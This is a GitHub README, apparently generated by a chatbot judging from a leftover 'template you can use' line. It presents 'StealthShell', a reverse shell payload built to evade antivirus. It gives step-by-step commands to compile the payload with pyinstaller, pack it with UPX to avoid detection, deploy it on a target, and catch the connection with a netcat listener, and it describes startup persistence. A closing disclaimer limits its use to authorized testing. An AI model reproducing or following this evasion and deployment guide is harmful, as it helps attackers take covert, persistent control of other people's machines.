# StealthShell
StealthShell is a reverse shell payload that bypasses antivirus defenses by obfuscating and packing the executable with UPX. It silently establishes a remote connection, allowing persistent control over the compromised system.
________________________________________________________________________________
Here’s a detailed README file template for **StealthShell** that you can use on GitHub:

---

# StealthShell

**StealthShell** is a reverse shell payload designed to bypass antivirus defenses, including Microsoft Defender, by obfuscating and packing the executable using UPX (Ultimate Packer for Executables). It allows for silent remote access to a compromised system, providing persistent control without detection.

## Features

- **Reverse Shell**: Establishes a reverse shell connection for remote command execution.
- **Obfuscation**: Code obfuscation techniques to hide the payload’s true intent.
- **UPX Packing**: Compression of the executable using UPX to evade signature-based antivirus detection.
- **Persistence**: Ability to maintain control over the target system without raising alarms.
- **Cross-platform**: Can be compiled for both 32-bit and 64-bit Windows systems.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [How It Works](#how-it-works)
- [Prerequisites](#prerequisites)
- [Building the Payload](#building-the-payload)
- [License](#license)
- [Disclaimer](#disclaimer)

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/varun935/StealthShell.git
   cd StealthShell
   ```

2. Ensure you have Python 3.6 or higher installed, along with the required dependencies:
   ```bash
   pip install -r requirements.txt
   ```

3. Install UPX (if not already installed):
   - **Windows**: Download UPX from [https://upx.github.io/](https://upx.github.io/) and add it to your PATH.
   - **Linux**: Install UPX using package managers:
     ```bash
     sudo apt install upx
     ```

## Usage

1. **Modify the Payload Script**: Edit the `reverse_shell.py` file to change the attacker's IP address and port number to your own setup.

2. **Generate the Executable**:
   After modifying the script, convert the Python file into an executable:
   ```bash
   pyinstaller --onefile reverse_shell.py
   ```

3. **Pack the Executable with UPX**:
   Once you have the `.exe` file, use UPX to pack it for better evasion:
   ```bash
   upx --force dist/reverse_shell.exe
   ```

4. **Deploy the Payload**: Transfer the packed executable to the target machine and execute it. Once executed, it will attempt to establish a reverse shell to the specified IP and port.

5. **Listen for the Connection**:
   On your attacking machine, run Netcat or any other listener on the specified port:
   ```bash
   nc -lvnp <port>
   ```

   Once the reverse shell is established, you'll have full control of the target system.

## How It Works

1. **Obfuscation**: The `reverse_shell.py` script is obfuscated using techniques like encoding or encryption to hide its functionality, making it more difficult for antivirus programs to detect.
   
2. **UPX Packing**: The executable is packed using UPX, which compresses the file and modifies its structure, further reducing the likelihood of detection by antivirus software that relies on signature-based detection methods.

3. **Reverse Shell**: Upon execution, the payload creates a reverse shell connection back to the attacker's machine. This allows for remote control and command execution.

4. **Persistence**: The payload can be configured to execute on system startup, ensuring that the attacker maintains control even after system reboots.

## Prerequisites

- Python 3.6 or higher
- PyInstaller
- UPX (Ultimate Packer for Executables)
- Netcat (for listening to reverse shell)

## Building the Payload

To build the payload, follow these steps:

1. Clone the repository and install the dependencies.
2. Modify the Python script to configure the attacker's IP and port.
3. Use `pyinstaller` to compile the Python script into an executable.
4. Pack the `.exe` with UPX to minimize detection by antivirus programs.
5. Deploy the executable on the target machine.

## Disclaimer

**StealthShell** is intended for ethical penetration testing and educational purposes only. Do not use it for unauthorized access to systems. Misuse of this tool is illegal and can result in severe penalties under computer fraud laws. Always have explicit permission from the owner of the systems you are testing.

